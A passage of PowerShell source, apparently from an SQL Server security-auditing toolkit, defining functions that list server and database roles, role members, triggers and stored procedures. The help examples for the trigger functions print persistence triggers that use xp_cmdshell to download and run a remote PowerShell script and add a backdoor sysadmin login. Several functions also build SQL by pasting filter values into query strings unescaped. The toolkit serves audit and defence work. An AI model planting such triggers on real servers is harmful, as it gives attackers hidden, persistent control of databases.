        $TblServerRoles = New-Object System.Data.DataTable
        $TblServerRoles.Columns.Add("ComputerName") | Out-Null
        $TblServerRoles.Columns.Add("Instance") | Out-Null
        $TblServerRoles.Columns.Add("RolePrincipalId") | Out-Null
        $TblServerRoles.Columns.Add("RolePrincipalSid") | Out-Null
        $TblServerRoles.Columns.Add("RolePrincipalName") | Out-Null
        $TblServerRoles.Columns.Add("RolePrincipalType") | Out-Null
        $TblServerRoles.Columns.Add("OwnerPrincipalId") | Out-Null
        $TblServerRoles.Columns.Add("OwnerPrincipalName") | Out-Null
        $TblServerRoles.Columns.Add("is_disabled") | Out-Null
        $TblServerRoles.Columns.Add("is_fixed_role") | Out-Null
        $TblServerRoles.Columns.Add("create_date") | Out-Null
        $TblServerRoles.Columns.Add("modify_Date") | Out-Null
        $TblServerRoles.Columns.Add("default_database_name") | Out-Null

        # Setup owner filter
        if ($RoleOwner){
            $RoleOwnerFilter = " AND suser_name(owning_principal_id) like '$RoleOwner'"
        }else{
            $RoleOwnerFilter = ""
        }

        # Setup role name
        if ($RolePrincipalName){
            $PrincipalNameFilter = " AND name like '$RolePrincipalName'"
        }else{
            $PrincipalNameFilter = ""
        }
    }

    Process
    { 
        # Note: Tables queried by this function typically require sysadmin privileges to get all rows
                   
        # Parse computer name from the instance
        $ComputerName = Get-ComputerNameFromInstance -Instance $Instance

        # Default connection to local default instance
        if(-not $Instance){
            $Instance = $env:COMPUTERNAME
        }

        # Define Query
        $Query = "SELECT   '$ComputerName' as [ComputerName],
                           '$Instance' as [Instance],
                           principal_id as [RolePrincipalId],
                           sid as [RolePrincipalSid], 
                           name as [RolePrincipalName],
                           type_desc as [RolePrincipalType],
                           owning_principal_id as [OwnerPrincipalId],
                           suser_name(owning_principal_id) as [OwnerPrincipalName],
                           is_disabled,
                           is_fixed_role,
                           create_date,
                           modify_Date,
                           default_database_name              
                  FROM [master].[sys].[server_principals] WHERE type like 'R'
                  $PrincipalNameFilter
                  $RoleOwnerFilter"   

        # Execute Query
        $TblServerRolesTemp =  Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential
        
        # Update sid formatting for each entry
        $TblServerRolesTemp | 
        ForEach-Object {

            # Format principal sid
            $NewSid = [System.BitConverter]::ToString($_.RolePrincipalSid).Replace("-","")
            if ($NewSid.length -le 10){                
                $Sid = [Convert]::ToInt32($NewSid,16)
            }else{
                $Sid = $NewSid
            }

            # Add results to table
            $TblServerRoles.Rows.Add(
                [string]$_.ComputerName,
                [string]$_.Instance,
                [string]$_.RolePrincipalId,
                $Sid,
                $_.RolePrincipalName,
                [string]$_.RolePrincipalType,
                [string]$_.OwnerPrincipalId,
                [string]$_.OwnerPrincipalName,
                [string]$_.is_disabled,
                [string]$_.is_fixed_role,
                $_.create_date,
                $_.modify_Date,
                [string]$_.default_database_name) | Out-Null         
        }                        
    }

    End
    {  
        # Return data
        $TblServerRoles          
    }
}


# ----------------------------------
#  Get-SQLServerRoleMember
# ----------------------------------
# Author: Scott Sutherland
Function  Get-SQLServerRoleMember {
<#
    .SYNOPSIS
        Returns SQL Server role member information from target SQL Servers.
    .PARAMETER Username
        SQL Server or domain account to authenticate with.   
    .PARAMETER Password
        SQL Server or domain account password to authenticate with. 
    .PARAMETER Credential
        SQL Server credential. 
    .PARAMETER Instance
        SQL Server instance to connection to. 
    .PARAMETER RolePrincipalName
        Role principal name to filter for. 
    .PARAMETER PrincipalName
        Principal name to filter for. 
    .EXAMPLE
        PS C:\> Get-SQLServerRoleMember -Instance SQLServer1\STANDARDDEV2014 -PrincipalName MyUser

        ComputerName      : SQLServer1
        Instance          : SQLServer1\STANDARDDEV2014
        RolePrincipalId   : 3
        RolePrincipalName : sysadmin
        PrincipalId       : 272
        PrincipalName     : MyUser

        ComputerName      : SQLServer1
        Instance          : SQLServer1\STANDARDDEV2014
        RolePrincipalId   : 6
        RolePrincipalName : setupadmin
        PrincipalId       : 272
        PrincipalName     : MyUser

        ComputerName      : SQLServer1
        Instance          : SQLServer1\STANDARDDEV2014
        RolePrincipalId   : 276
        RolePrincipalName : MyCustomRole
        PrincipalId       : 272
        PrincipalName     : MyUser
    .EXAMPLE
        PS C:\> Get-SQLInstanceLocal | Get-SQLServerRoleMember -Verbose
#>
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$false,
        HelpMessage="SQL Server or domain account to authenticate with.")]
        [string]$Username,

        [Parameter(Mandatory=$false,
        HelpMessage="SQL Server or domain account password to authenticate with.")]
        [string]$Password,

        [Parameter(Mandatory=$false,
        HelpMessage="Windows credentials.")]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        
        [Parameter(Mandatory=$false,
        ValueFromPipelineByPropertyName=$true,
        HelpMessage="SQL Server instance to connection to.")]
        [string]$Instance,

        [Parameter(Mandatory=$false,
        ValueFromPipelineByPropertyName=$true,
        HelpMessage="Role name.")]
        [string]$RolePrincipalName,

        [Parameter(Mandatory=$false,
        ValueFromPipelineByPropertyName=$true,
        HelpMessage="SQL login or Windows account name.")]
        [string]$PrincipalName
    )

    Begin
    {
        # Table for output
        $TblServerRoleMembers = New-Object System.Data.DataTable

        # Setup role name filter
        if ($RolePrincipalName){
            $RoleOwnerFilter = " AND SUSER_NAME(role_principal_id) like '$RolePrincipalName'"
        }else{
            $RoleOwnerFilter = ""
        }

        # Setup login name filter
        if ($PrincipalName){
            $PrincipalNameFilter = " AND SUSER_NAME(member_principal_id) like '$PrincipalName'"
        }else{
            $PrincipalNameFilter = ""
        }
    }

    Process
    { 
        # Note: Tables queried by this function typically require sysadmin privileges to get all rows

        # Parse computer name from the instance
        $ComputerName = Get-ComputerNameFromInstance -Instance $Instance

        # Default connection to local default instance
        if(-not $Instance){
            $Instance = $env:COMPUTERNAME
        }

        # Define Query
        $Query = "  SELECT  '$ComputerName' as [ComputerName],
                            '$Instance' as [Instance],role_principal_id as [RolePrincipalId],
                            SUSER_NAME(role_principal_id) as [RolePrincipalName],
                            member_principal_id as [PrincipalId],
                            SUSER_NAME(member_principal_id) as [PrincipalName] 
                    FROM sys.server_role_members WHERE 1=1
                    $PrincipalNameFilter
                    $RoleOwnerFilter"

        # Execute Query
        $TblServerRoleMembersTemp =  Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential

        # Append as needed
        $TblServerRoleMembers = $TblServerRoleMembers + $TblServerRoleMembersTemp
    }

    End
    {  
        # Return role members
        $TblServerRoleMembers             
    }
}


# ----------------------------------
#  Get-SQLDatabaseRole
# ----------------------------------
# Author: Scott Sutherland
# Reference: https://technet.microsoft.com/en-us/library/ms189612(v=sql.105).aspx
Function  Get-SQLDatabaseRole {
<#
    .SYNOPSIS
        Returns database role information from target SQL Servers.
    .PARAMETER Username
        SQL Server or domain account to authenticate with.   
    .PARAMETER Password
        SQL Server or domain account password to authenticate with. 
    .PARAMETER Credential
        SQL Server credential. 
    .PARAMETER Instance
        SQL Server instance to connection to. 
    .PARAMETER DAC
        Connect using Dedicated Admin Connection. 
    .PARAMETER DatabaseName
        Database name to filter for.
    .PARAMETER NoDefaults
        Only select non default databases.
    .PARAMETER RolePrincipalName
        Role principalname to filter for. 
    .PARAMETER RoleOwner
        Role owner's name to filter for.    

    .EXAMPLE
        PS C:\> Get-SQLDatabaseRole -Instance SQLServer1\STANDARDDEV2014 -DatabaseName testdb -RolePrincipalName DB_OWNER

        ComputerName        : SQLServer1
        Instance            : SQLServer1\STANDARDDEV2014
        DatabaseName        : testdb
        RolePrincipalId     : 16384
        RolePrincipalSid    : 01050000000000090400000000000000000000000000000000400000
        RolePrincipalName   : db_owner
        RolePrincipalType   : DATABASE_ROLE
        OwnerPrincipalId    : 1
        OwnerPrincipalName  : sa
        is_fixed_role       : True
        create_date         : 4/8/2003 9:10:42 AM
        modify_Date         : 4/13/2009 12:59:14 PM
        default_schema_name : 
    .EXAMPLE
        PS C:\> Get-SQLInstanceLocal | Get-SQLDatabaseRole -Verbose
#>
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$false,
        HelpMessage="SQL Server or domain account to authenticate with.")]
        [string]$Username,

        [Parameter(Mandatory=$false,
        HelpMessage="SQL Server or domain account password to authenticate with.")]
        [string]$Password,

        [Parameter(Mandatory=$false,
        HelpMessage="Windows credentials.")]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        
        [Parameter(Mandatory=$false,
        ValueFromPipelineByPropertyName=$true,
        HelpMessage="SQL Server instance to connection to.")]
        [string]$Instance,

        [Parameter(Mandatory=$false,                
        ValueFromPipelineByPropertyName=$true,
        HelpMessage="SQL Server database name.")]
        [string]$DatabaseName,
        
        [Parameter(Mandatory=$false,
        ValueFromPipelineByPropertyName=$true,
        HelpMessage="Role name.")]
        [string]$RolePrincipalName,

        [Parameter(Mandatory=$false,
        ValueFromPipelineByPropertyName=$true,
        HelpMessage="Role owner's name.")]
        [string]$RoleOwner,

        [Parameter(Mandatory=$false,
        HelpMessage="Only select non default databases.")]
        [switch]$NoDefaults,

        [Parameter(Mandatory=$false,
        HelpMessage="Suppress verbose errors.  Used when function is wrapped.")]
        [switch]$SuppressVerbose
    )

    Begin
    {                
        # Setup table for output
        $TblDatabaseRoles = New-Object System.Data.DataTable
        $TblDatabaseRoles.Columns.Add("ComputerName") | Out-Null
        $TblDatabaseRoles.Columns.Add("Instance") | Out-Null
        $TblDatabaseRoles.Columns.Add("DatabaseName") | Out-Null
        $TblDatabaseRoles.Columns.Add("RolePrincipalId") | Out-Null
        $TblDatabaseRoles.Columns.Add("RolePrincipalSid") | Out-Null
        $TblDatabaseRoles.Columns.Add("RolePrincipalName") | Out-Null
        $TblDatabaseRoles.Columns.Add("RolePrincipalType") | Out-Null
        $TblDatabaseRoles.Columns.Add("OwnerPrincipalId") | Out-Null
        $TblDatabaseRoles.Columns.Add("OwnerPrincipalName") | Out-Null
        $TblDatabaseRoles.Columns.Add("is_fixed_role") | Out-Null
        $TblDatabaseRoles.Columns.Add("create_date") | Out-Null
        $TblDatabaseRoles.Columns.Add("modify_Date") | Out-Null
        $TblDatabaseRoles.Columns.Add("default_schema_name") | Out-Null

        # Setup RoleOwner filter
        if ($RoleOwner){
            $RoleOwnerFilter = " AND suser_name(owning_principal_id) like '$RoleOwner'"
        }else{
            $RoleOwnerFilter = ""
        }

        # Setup RolePrincipalName filter
        if ($RolePrincipalName){
            $RolePrincipalNameFilter = " AND name like '$RolePrincipalName'"
        }else{
            $RolePrincipalNameFilter = ""
        }                    
    }

    Process
    {        
        # Parse computer name from the instance
        $ComputerName = Get-ComputerNameFromInstance -Instance $Instance

        # Default connection to local default instance
        if(-not $Instance){
            $Instance = $env:COMPUTERNAME
        }

        # Test connection to instance
        $TestConnection =  Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Where-Object {$_.Status -eq "Accessible"}
        if($TestConnection){   
            
            if( -not $SuppressVerbose){
                Write-Verbose "$Instance : Connection Success."
            }
        }else{
            
            if( -not $SuppressVerbose){
                Write-Verbose "$Instance : Connection Failed."
            }
            return
        }

        # Get list of databases
        if($NoDefaults){
            $TblDatabases =  Get-SQLDatabase -Instance $Instance -Username $Username -Password $Password -Credential $Credential -HasAccess -DatabaseName $DatabaseName -SuppressVerbose -NoDefaults
        }else{
                $TblDatabases =  Get-SQLDatabase -Instance $Instance -Username $Username -Password $Password -Credential $Credential -HasAccess -DatabaseName $DatabaseName -SuppressVerbose
        }

        # Get role for each database
        $TblDatabases |
        ForEach-Object{

            # Get database name
            $DbName = $_.DatabaseName

            if( -not $SuppressVerbose){
                Write-Verbose "$Instance : Getting roles from the $DbName database."
            }   

            # Define Query
            $Query = "  USE $DbName;
                        SELECT  '$ComputerName' as [ComputerName],
                                '$Instance' as [Instance],
                                '$DbName' as [DatabaseName],
                                principal_id as [RolePrincipalId],
                                sid as [RolePrincipalSid], 
                                name as [RolePrincipalName],
                                type_desc as [RolePrincipalType],
                                owning_principal_id as [OwnerPrincipalId],
                                suser_name(owning_principal_id) as [OwnerPrincipalName],
                                is_fixed_role,
                                create_date,
                                modify_Date,
                                default_schema_name              
                        FROM [$DbName].[sys].[database_principals] 
                        WHERE type like 'R'
                        $RolePrincipalNameFilter
                        $RoleOwnerFilter" 

            # Execute Query
            $TblDatabaseRolesTemp =  Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential -SuppressVerbose            

            # Update sid formatting for each entry and append results
            $TblDatabaseRolesTemp | 
            ForEach-Object {

                # Format principal sid
                $NewSid = [System.BitConverter]::ToString($_.RolePrincipalSid).Replace("-","")
                if ($NewSid.length -le 10){                
                    $Sid = [Convert]::ToInt32($NewSid,16)
                }else{
                    $Sid = $NewSid
                }

                # Add results to table
                $TblDatabaseRoles.Rows.Add(
                    [string]$_.ComputerName,
                    [string]$_.Instance,
                    [string]$_.DatabaseName,
                    [string]$_.RolePrincipalId,
                    $Sid,
                    $_.RolePrincipalName,
                    [string]$_.RolePrincipalType,
                    [string]$_.OwnerPrincipalId,
                    [string]$_.OwnerPrincipalName,
                    [string]$_.is_fixed_role,
                    $_.create_date,
                    $_.modify_Date,
                    [string]$_.default_schema_name) | Out-Null         
            }              
        }                                 
    }

    End
    {         
        # Return data
        $TblDatabaseRoles         
    }
}


# ----------------------------------
#  Get-SQLDatabaseRoleMember
# ----------------------------------
# Author: Scott Sutherland
Function  Get-SQLDatabaseRoleMember {
<#
    .SYNOPSIS
        Returns database role member information from target SQL Servers.
    .PARAMETER Username
        SQL Server or domain account to authenticate with.   
    .PARAMETER Password
        SQL Server or domain account password to authenticate with. 
    .PARAMETER Credential
        SQL Server credential. 
    .PARAMETER Instance
        SQL Server instance to connection to. 
    .PARAMETER DAC
        Connect using Dedicated Admin Connection. 
    .PARAMETER DatabaseName
        Database name to filter for.
    .PARAMETER RolePrincipalName
        Role principalname to filter for. 
    .PARAMETER PrincipalName
        Name of principal or Role to filter for.    

    .EXAMPLE
        PS C:\> Get-SQLDatabaseRoleMember -Instance SQLServer1\STANDARDDEV2014 -DatabaseName testdb -PrincipalName evil

        ComputerName      : SQLServer1
        Instance          : SQLServer1\STANDARDDEV2014
        DatabaseName      : testdb
        RolePrincipalId   : 16387
        RolePrincipalName : db_ddladmin
        PrincipalId       : 5
        PrincipalName     : evil

        ComputerName      : SQLServer1
        Instance          : SQLServer1\STANDARDDEV2014
        DatabaseName      : testdb
        RolePrincipalId   : 16391
        RolePrincipalName : db_datawriter
        PrincipalId       : 5
        PrincipalName     : evil
    .EXAMPLE
        PS C:\> Get-SQLInstanceLocal | Get-SQLDatabaseRoleMember -Verbose
#>
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$false,
        ValueFromPipelineByPropertyName=$true,
        HelpMessage="SQL Server or domain account to authenticate with.")]
        [string]$Username,

        [Parameter(Mandatory=$false,
        ValueFromPipelineByPropertyName=$true,
        HelpMessage="SQL Server or domain account password to authenticate with.")]
        [string]$Password,

        [Parameter(Mandatory=$false,
        HelpMessage="Windows credentials.")]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        
        [Parameter(Mandatory=$false,
        ValueFromPipelineByPropertyName=$true,
        HelpMessage="SQL Server instance to connection to.")]
        [string]$Instance,

        [Parameter(Mandatory=$false,                
        ValueFromPipelineByPropertyName=$true,
        HelpMessage="SQL Server database name.")]
        [string]$DatabaseName,
        
        [Parameter(Mandatory=$false,
        ValueFromPipelineByPropertyName=$true,
        HelpMessage="Role name.")]
        [string]$RolePrincipalName,

        [Parameter(Mandatory=$false,
        ValueFromPipelineByPropertyName=$true,
        HelpMessage="SQL login or Windows account name.")]
        [string]$PrincipalName,

        [Parameter(Mandatory=$false,
        HelpMessage="Only select non default databases.")]
        [switch]$NoDefaults,

        [Parameter(Mandatory=$false,
        HelpMessage="Suppress verbose errors.  Used when function is wrapped.")]
        [switch]$SuppressVerbose
    )

    Begin
    {
        # Table for output
        $TblDatabaseRoleMembers = New-Object System.Data.DataTable

        # Setup login filter
        if ($PrincipalName){
            $PrincipalNameFilter = " AND USER_NAME(member_principal_id) like '$PrincipalName'"
        }else{
            $PrincipalNameFilter = ""
        }

        # Setup role name
        if ($RolePrincipalName){
            $RolePrincipalNameFilter = " AND USER_NAME(role_principal_id) like '$RolePrincipalName'"
        }else{
            $RolePrincipalNameFilter = ""
        }
    }

    Process
    {        
        # Note: Tables queried by this function typically require sysadmin or DBO privileges.

        # Parse computer name from the instance
        $ComputerName = Get-ComputerNameFromInstance -Instance $Instance

        # Default connection to local default instance
        if(-not $Instance){
            $Instance = $env:COMPUTERNAME
        }

        # Test connection to instance
        $TestConnection =  Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Where-Object {$_.Status -eq "Accessible"}
        if($TestConnection){   
            
            if( -not $SuppressVerbose){
                Write-Verbose "$Instance : Connection Success."
            }
        }else{
            
            if( -not $SuppressVerbose){
                Write-Verbose "$Instance : Connection Failed."
            }
            return
        }

        # Get list of databases
        if($NoDefaults){
            $TblDatabases =  Get-SQLDatabase -Instance $Instance -Username $Username -Password $Password -Credential $Credential -HasAccess -DatabaseName $DatabaseName -NoDefaults -SuppressVerbose
        }else{
            $TblDatabases =  Get-SQLDatabase -Instance $Instance -Username $Username -Password $Password -Credential $Credential -HasAccess -DatabaseName $DatabaseName -SuppressVerbose
        }

        # Get roles for each database
        $TblDatabases |
        ForEach-Object{

            # Get database name
            $DbName = $_.DatabaseName

            if( -not $SuppressVerbose){
                Write-Verbose "$Instance : Getting role members for the $DbName database..."
            }

            # Define Query
            $Query = "  USE $DbName;
                        SELECT  '$ComputerName' as [ComputerName],
                                '$Instance' as [Instance],
                                '$DbName' as [DatabaseName],
                                role_principal_id as [RolePrincipalId],
                                USER_NAME(role_principal_id) as [RolePrincipalName],
                                member_principal_id as [PrincipalId],
                                USER_NAME(member_principal_id) as [PrincipalName] 
                        FROM [$DbName].[sys].[database_role_members]
                        WHERE 1=1
                        $RolePrincipalNameFilter
                        $PrincipalNameFilter" 

            # Execute Query
            $TblDatabaseRoleMembersTemp =  Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential -SuppressVerbose

            # Append results
            $TblDatabaseRoleMembers = $TblDatabaseRoleMembers + $TblDatabaseRoleMembersTemp
        }                                         
    }

    End
    {  
        # Return data
        $TblDatabaseRoleMembers        
    }
}


# ----------------------------------
#  Get-SQLTriggerDdl
# ----------------------------------
# Author: Scott Sutherland
Function  Get-SQLTriggerDdl {
<#
    .SYNOPSIS
        Returns DDL trigger information from target SQL Servers. This includes logon triggers.
    .PARAMETER Username
        SQL Server or domain account to authenticate with.   
    .PARAMETER Password
        SQL Server or domain account password to authenticate with. 
    .PARAMETER Credential
        SQL Server credential. 
    .PARAMETER Instance
        SQL Server instance to connection to. 
    .PARAMETER TriggerName
        Trigger name to filter for. 
    .EXAMPLE
        PS C:\> Get-SQLTriggerDdl -Instance SQLServer1\STANDARDDEV2014 

        ComputerName      : SQLServer1
        Instance          : SQLServer1\STANDARDDEV2014
        TriggerName       : persistence_ddl_1
        TriggerId         : 1104722988
        TriggerType       : SERVER
        ObjectType        : SQL_TRIGGER
        ObjectClass       : SERVER
        TriggerDefinition : -- Create the DDL trigger
                            CREATE Trigger [persistence_ddl_1]
                            ON ALL Server
                            FOR DDL_LOGIN_EVENTS
                            AS
                     
                            -- Download and run a PowerShell script from the internet
                            EXEC master..xp_cmdshell 'Powershell -c "IEX(new-object 
                            net.webclient).downloadstring(''https://raw.githubusercontent.com/nullbind/Powershellery/master/Brainstorming/trigger_demo_ddl.ps1'')"';
                     
                            -- Add a sysadmin named 'SysAdmin_DDL' if it doesn't exist
                            if (SELECT count(name) FROM sys.sql_logins WHERE name like 'SysAdmin_DDL') = 0
                     
                                -- Create a login
                                CREATE LOGIN SysAdmin_DDL WITH PASSWORD = 'Password123!';
                        
                                -- Add the login to the sysadmin fixed server role
                                EXEC sp_addsrvrolemember 'SysAdmin_DDL', 'sysadmin';
                                                    
        create_date       : 4/26/2016 8:34:49 PM
        modify_date       : 4/26/2016 8:34:49 PM
        is_ms_shipped     : False
        is_disabled       : False
    .EXAMPLE
        PS C:\> Get-SQLInstanceDomain | Get-SQLTriggerDdl -Verbose
#>
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$false,
        HelpMessage="SQL Server or domain account to authenticate with.")]
        [string]$Username,

        [Parameter(Mandatory=$false,
        HelpMessage="SQL Server or domain account password to authenticate with.")]
        [string]$Password,

        [Parameter(Mandatory=$false,
        HelpMessage="Windows credentials.")]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        
        [Parameter(Mandatory=$false,
        ValueFromPipelineByPropertyName=$true,
        HelpMessage="SQL Server instance to connection to.")]
        [string]$Instance,
        
        [Parameter(Mandatory=$false,
        ValueFromPipelineByPropertyName=$true,
        HelpMessage="Trigger name.")]
        [string]$TriggerName
    )

    Begin
    {
        # Table for output
        $TblDdlTriggers = New-Object System.Data.DataTable

        # Setup role name
        if ($TriggerName){
            $TriggerNameFilter = " AND name like '$TriggerName'"
        }else{
            $TriggerNameFilter = ""
        }
    }

    Process
    {
        # Note: Tables queried by this function typically require sysadmin privileges to get all rows.

        # Parse computer name from the instance
        $ComputerName = Get-ComputerNameFromInstance -Instance $Instance

        # Default connection to local default instance
        if(-not $Instance){
            $Instance = $env:COMPUTERNAME
        }

        # Define Query
        $Query = " SELECT 	'$ComputerName' as [ComputerName],
                            '$Instance' as [Instance],
                            name as [TriggerName],
                            object_id as [TriggerId],
                            [TriggerType] = 'SERVER',
                            type_desc as [ObjectType],
                            parent_class_desc as [ObjectClass],
                            OBJECT_DEFINITION(OBJECT_ID) as [TriggerDefinition],
                            create_date,
                            modify_date,
                            is_ms_shipped,
                            is_disabled
                   FROM [master].[sys].[server_triggers] WHERE 1=1
                   $TriggerNameFilter" 

        # Execute Query
        $TblDdlTriggersTemp =  Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential

        # Append results
        $TblDdlTriggers = $TblDdlTriggers  + $TblDdlTriggersTemp  
    }

    End
    {  
        # Return data
        $TblDdlTriggers        
    }
}


# ----------------------------------
#  Get-SQLTriggerDml
# ----------------------------------
# Author: Scott Sutherland
Function  Get-SQLTriggerDml {
<#
    .SYNOPSIS
        Returns DML trigger information from target SQL Servers.
    .PARAMETER Username
        SQL Server or domain account to authenticate with.   
    .PARAMETER Password
        SQL Server or domain account password to authenticate with. 
    .PARAMETER Credential
        SQL Server credential. 
    .PARAMETER Instance
        SQL Server instance to connection to. 
    .PARAMETER DatabaseName
        Database name to filter for.
    .PARAMETER TriggerName
        Trigger name to filter for. 
    .EXAMPLE
        PS C:\> Get-SQLTriggerDml -Instance SQLServer1\STANDARDDEV2014 -DatabaseName testdb

        ComputerName           : SQLServer1
        Instance               : SQLServer1\STANDARDDEV2014
        DatabaseName           : testdb
        TriggerName            : persistence_dml_1
        TriggerId              : 565577053
        TriggerType            : DATABASE
        ObjectType             : SQL_TRIGGER
        ObjectClass            : OBJECT_OR_COLUMN
        TriggerDefinition      : -- Create trigger
                                 CREATE TRIGGER [persistence_dml_1]
                                 ON testdb.dbo.NOCList 
                                 FOR INSERT, UPDATE, DELETE AS
                          
                                 -- Impersonate sa
                                 EXECUTE AS LOGIN = 'sa'
                          
                                 -- Download a PowerShell script from the internet to memory and execute it
                                 EXEC master..xp_cmdshell 'Powershell -c "IEX(new-object 
                                 net.webclient).downloadstring(''https://raw.githubusercontent.com/nullbind/Powershellery/master/Brainstorming/trigger_demo_dml.ps1'')"';
                          
                                 -- Add a sysadmin named 'SysAdmin_DML' if it doesn't exist
                                 if (select count(*) from sys.sql_logins where name like 'SysAdmin_DML') = 0
                          
                                     -- Create a login
                                     CREATE LOGIN SysAdmin_DML WITH PASSWORD = 'Password123!';
                             
                                     -- Add the login to the sysadmin fixed server role
                                     EXEC sp_addsrvrolemember 'SysAdmin_DML', 'sysadmin';
                         
        create_date            : 4/26/2016 8:58:28 PM
        modify_date            : 4/26/2016 8:58:28 PM
        is_ms_shipped          : False
        is_disabled            : False
        is_not_for_replication : False
        is_instead_of_trigger  : False        
    .EXAMPLE
        PS C:\> Get-SQLInstanceDomain | Get-SQLTriggerDml -Verbose
#>
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$false,
        HelpMessage="SQL Server or domain account to authenticate with.")]
        [string]$Username,

        [Parameter(Mandatory=$false,
        HelpMessage="SQL Server or domain account password to authenticate with.")]
        [string]$Password,

        [Parameter(Mandatory=$false,
        HelpMessage="Windows credentials.")]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        
        [Parameter(Mandatory=$false,
        ValueFromPipelineByPropertyName=$true,
        HelpMessage="SQL Server instance to connection to.")]
        [string]$Instance,

        [Parameter(Mandatory=$false,                
        ValueFromPipelineByPropertyName=$true,
        HelpMessage="SQL Server database name.")]
        [string]$DatabaseName,
        
        [Parameter(Mandatory=$false,
        ValueFromPipelineByPropertyName=$true,
        HelpMessage="Trigger name.")]
        [string]$TriggerName

    )

    Begin
    {
        # Table for output
        $TblDmlTriggers = New-Object System.Data.DataTable

        # Setup login filter
        if ($TriggerName){
            $TriggerNameFilter = " AND name like '$TriggerName'"
        }else{
            $TriggerNameFilter = ""
        }
    }

    Process
    {        
        # Note: Tables queried by this function typically require sysadmin privileges to get all rows.

        # Parse computer name from the instance
        $ComputerName = Get-ComputerNameFromInstance -Instance $Instance

        # Default connection to local default instance
        if(-not $Instance){
            $Instance = $env:COMPUTERNAME
        }
            
        # Get list of databases
        $TblDatabases =  Get-SQLDatabase -Instance $Instance -Username $Username -Password $Password -Credential $Credential -HasAccess -DatabaseName $DatabaseName  

        # Get role for each database
        $TblDatabases |
        ForEach-Object{

            # Get database name
            $DbName = $_.DatabaseName

            # Define Query
            $Query = "  use [$DbName]; 
                        SELECT  '$ComputerName' as [ComputerName],
                                '$Instance' as [Instance],
                                '$DbName' as [DatabaseName],
                                name as [TriggerName],
                                object_id as [TriggerId],
                                [TriggerType] = 'DATABASE',
                                type_desc as [ObjectType],
                                parent_class_desc as [ObjectClass],
                                OBJECT_DEFINITION(OBJECT_ID) as [TriggerDefinition],
                                create_date,
                                modify_date,
                                is_ms_shipped,
                                is_disabled,
                                is_not_for_replication,
                                is_instead_of_trigger
                        FROM [$DbName].[sys].[triggers] WHERE 1=1
                        $TriggerNameFilter" 

            # Execute Query
            $TblDmlTriggersTemp =  Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential

            # Append results
            $TblDmlTriggers = $TblDmlTriggers + $TblDmlTriggersTemp
        }                                
    }

    End
    {  
        # Return data
        $TblDmlTriggers        
    }
}


# ----------------------------------
#  Get-SQLStoredProcure
# ----------------------------------
# Author: Scott Sutherland
Function  Get-SQLStoredProcure {
<#
    .SYNOPSIS
        Returns stored procedures from target SQL Servers.
        Note: Viewing procedure definitions requires the sysadmin role or the VIEW DEFINITION permission.
    .PARAMETER Username
        SQL Server or domain account to authenticate with.   
    .PARAMETER Password
        SQL Server or domain account password to authenticate with. 
    .PARAMETER Credential
        SQL Server credential. 
    .PARAMETER Instance
        SQL Server instance to connection to. 
    .PARAMETER DatabaseName
        Database name to filter for. 
    .PARAMETER ProcedureName
        Procedure name to filter for. 
    .PARAMETER NoDefaults
        Filter out results from default databases. 
    .EXAMPLE
        PS C:\> Get-SQLStoredProcure -Instance SQLServer1\STANDARDDEV2014 -NoDefaults -DatabaseName testdb

        ComputerName        : SQLServer1
        Instance            : SQLServer1\STANDARDDEV2014
        DatabaseName        : testdb
        SchemaName          : dbo
        ProcedureName       : MyTestProc
        ProcedureType       : PROCEDURE
        ProcedureDefinition : CREATE PROC MyTestProc
                              WITH EXECUTE AS OWNER 
                              as
                              begin
                              select SYSTEM_USER as currentlogin, ORIGINAL_LOGIN() as originallogin                              
                              end
    .EXAMPLE
        PS C:\> Get-SQLInstanceDomain | Get-SQLStoredProcure -Verbose -NoDefaults
#>

    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$false,
        HelpMessage="SQL Server or domain account to authenticate with.")]
        [string]$Username,

        [Parameter(Mandatory=$false,
        HelpMessage="SQL Server or domain account password to authenticate with.")]
        [string]$Password,

        [Parameter(Mandatory=$false,
        HelpMessage="Windows credentials.")]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        
        [Parameter(Mandatory=$false,
        ValueFromPipelineByPropertyName=$true,
        HelpMessage="SQL Server instance to connection to.")]
        [string]$Instance,

        [Parameter(Mandatory=$false,                
        ValueFromPipelineByPropertyName=$true,
        HelpMessage="SQL Server database name.")]
        [string]$DatabaseName,
        
        [Parameter(Mandatory=$false,
        ValueFromPipelineByPropertyName=$true,
        HelpMessage="Trigger name.")]
        [string]$ProcedureName,

        [Parameter(Mandatory=$false,
        HelpMessage="Don't select tables from default databases.")]
        [switch]$NoDefaults
    )

    Begin
    {
        # Table for output
        $TblProcs = new-object System.Data.DataTable

        # Setup login filter
        if ($ProcedureName){
            $ProcedureNameFilter = " AND ROUTINE_NAME like '$ProcedureName'"
        }else{
            $ProcedureNameFilter = ""
        }
    }

    Process
    {        
        # Parse ComputerName
        If ($Instance){
            $ComputerName = $Instance.split("\")[0].split(",")[0]
            $Instance = $Instance
        }else{
            $ComputerName = $env:COMPUTERNAME
